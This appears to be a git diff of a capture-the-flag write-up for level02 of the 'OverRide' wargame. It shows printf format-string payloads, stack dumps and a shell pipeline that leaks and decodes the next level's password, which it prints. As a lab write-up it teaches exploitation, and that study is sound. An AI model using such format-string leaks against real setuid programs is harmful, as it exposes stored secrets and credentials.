@@ -7,32 +7,27 @@ level02@OverRide:~$ file level02
 level02: setuid setgid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xf639d5c443e6ff1c50a0f8393461c0befc329e71, not stripped
 ```
 
-The program read the `.pass` file of the next level. To debug it in gdb, we simply replace it with `tmp/.pass`.
+The program read the `.pass` file of the next level. To debug it in gdb, we extract the program to another machine to debug it. We create a file in `home/users/level03`:
 
-When reading it, the program make checks that the length must be equal to 41.
+```bash
+┌──(vagrant㉿kali)-[~]
+└─$ echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" > /home/users/level03/.pass
+```
+
+The first `fgets` will be printed as the only one argument of `printf` if the password read in the `.pass` and the password passed as input don't match.
+
+We try to print the stack, by passing modifiers as first input and empty string as second one:
+
+```bash
+--[ Username: %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p     
+--[ Password: 
+*****************************************
+ 0x7fff8c03a8d0 (nil) 0xffffffff 0x2a (nil) 0x7fff8c03aad8 0x100000000 (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) 0x8 0x4141414141414141 0x4141414141414141 0x4141414141414141 0x4141414141414141 0x4141414141414141 0x41 0x2520702520702520 0x2070252070252070 0x7025207025207025 does not have access!
+```
+
+As we know what contains the `.pass` file, we can see that its content begins to pop at the 22th element until the 27th.
 
 
-Description simplifier:
-
-Le binaire lit le fichier .pass du level suivant (/home/users/level03/.pass).
-Nous l'avons remplacer par /tmp/.pass.
-Le contenu du fichier est un peu controler pour voir si il peut etre authentique.
-Il devra au moins respecter la regle suivante:
-41 caracteres diffents de '\n' et un '\n'
-Pour ma part, j ai creer le fichier comme ceci:
-$ echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABCDEFGHIJL" > /tmp/.pass
-la commande echo creer un '\n' automatiquement en fin de la chaine de charactere.
-
-Il y a deux fgets(), mais seul le premier sera utile.
-
-Le premier fgets() va etre afficher a la fin du binaire a l'aide d'un printf().
-
-Le premier parametre du printf va etre notre premiere input, ce qui represente une faille de securite, nous pouvons donc examiner la stack a partir de $esp avec des arguments tels que %p, %lx ...
-
-Afin de pouvoir afficher le contenu des 30 * 16 premiers bytes de la stack j ai rentrer cette chaine de characteres dans la premiere input:
-"%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p "
-
- et une chaine de characteres vide dans la deuxieme input:
 
 Si nous examinons la stack frame a partir de $rsp juste avant le printf nous pouvons voir que les adresses ne sont pas coherentes car printf va rajouter des bytes sur la stack frame en creant d autres stack frames dans ses fonctions, mais nous avons une idee de ce que nous pourrons recuperer avec les Direct Access Parameters de printf().
 
@@ -102,25 +97,27 @@ Printf Direct Access Parameters:
 0x7fffffffe4d0 (nil) (nil) 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe6c8 0x1f7ff9a08 (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) 0x100000000 (nil) 0x4141414141414141 0x4141414141414141 0x4141414141414141 0x4241414141414141 0x4a49484746454443 0x4c 0x7025207025207025 0x2520702520702520 0x2070252070252070 does not have access!
 [Inferior 1 (process 24614) exited with code 01]
 
+We can know try to pop up the content of the `.pass` file. We use `l` for print a long-sized integer as we are in x64 architecture, and `x` to print the result in hex:
 
+```bash
+--[ Username: %22$lx %23$lx %24$lx %25$lx %26$lx %27$lx
+--[ Password: 
+*****************************************
+756e505234376848 45414a3561733951 377a7143574e6758 354a35686e475873 48336750664b394d 0 does not have access!
+```
 
-Nous pouvons donc recuperer le contenu du fichier .pass du level3 avec cette commande:
-(python -c 'print "%22$lx %23$lx %24$lx %25$lx %26$lx %27$lx"') | ./level02 | tail -n 1 | tr ' ' '\n' | head -n 5 | fold -w2 | tr -d '\n' >/tmp/test && dd conv=swab if=/tmp/test of=/tmp/result 2>/dev/null && cat /tmp/result | fold -w 16 | rev | tr -d '\n' | xxd -r -p; echo ""
+Let's try to decode it. We first put it in file and reverse each 2 bytes:
 
-et le resultat est:
+```bash
+level02@OverRide:~$ echo "756e50523437684845414a3561733951377a7143574e6758354a35686e47587348336750664b394d" > /tmp/test 
+level02@OverRide:~$ dd conv=swab if=/tmp/test of=/tmp/result 2>/dev/null
+level02@OverRide:~$ cat /tmp/result 
+57e60525437386845414a4531637931573a7173475e4768553a45386e67485378433760566b493d4
+```
+
+We need then to reverse bytes order each 16 bytes and print the result as ASCII values:
+
+```bash
+level02@OverRide:~$ cat /tmp/result | fold -w 16 | rev | tr -d '\n' | xxd -r -p
 Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
-
-Explication de la commande finale:
-(python -c 'print "%22$lx %23$lx %24$lx %25$lx %26$lx %27$lx"'): Afficher les bytes du fichier .pass
-./level02: Le binaire en question
-tail -n 1: On affiche que les bytes du fichier .pass (qui sont en little indian) en enlevant le superflu
-tr ' ' '\n: On remplace les ' ' par des '\n'
-head -n 5: On enleve encore un peu de superflu
-fold -w2: On met un '\n' tout les 2 chars
-tr -d '\n' >/tmp/test: On enleve les '\n' et on met le resultat dans /tmp/test
-dd conv=swab if=/tmp/test of=/tmp/result 2>/dev/null: On swap les char 2 par 2 et on n'affiche pas la sortie d erreur
-cat /tmp/result: On recupere le resultat
-fold -w 16: on met un '\n' tout les 16 chars
-rev: On inverse les strings lignes par lignes
-tr -d '\n': On enleve les '\n'
-xxd -r -p: On converti chaque element de la chaine en ascii
+```
